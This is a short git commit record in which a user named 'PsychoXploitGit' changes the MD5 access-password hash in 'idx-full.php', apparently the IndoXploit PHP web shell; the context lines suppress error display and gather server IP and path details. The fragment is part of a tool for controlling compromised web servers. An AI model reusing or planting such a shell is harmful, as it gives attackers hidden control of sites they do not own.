cc8b0b97446bc9f7c3be7653acbef5f1327abb44
PsychoXploitGit <dapidalexander@gmail.com>
2025-03-13 02:15:21 +0700

    Update idx-full.php

--- idx-full.php
+++ idx-full.php
@@ -14,7 +14,7 @@ if(version_compare(PHP_VERSION, '5.3.0', '<')) {
 @ini_set('output_buffering',0);
 @ini_set('display_errors', 0);
 
-$password = "7b4939a8af28c814f0c757bb10f40d3d"; # md5: IndoXploit
+$password = "04ed00b5109398453ad38b456409fdbf"; # md5: IndoXploit
 
 $SERVERIP  = (!$_SERVER['SERVER_ADDR']) ? gethostbyname($_SERVER['HTTP_HOST']) : $_SERVER['SERVER_ADDR'];
 $FILEPATH  = str_replace($_SERVER['DOCUMENT_ROOT'], "", path());
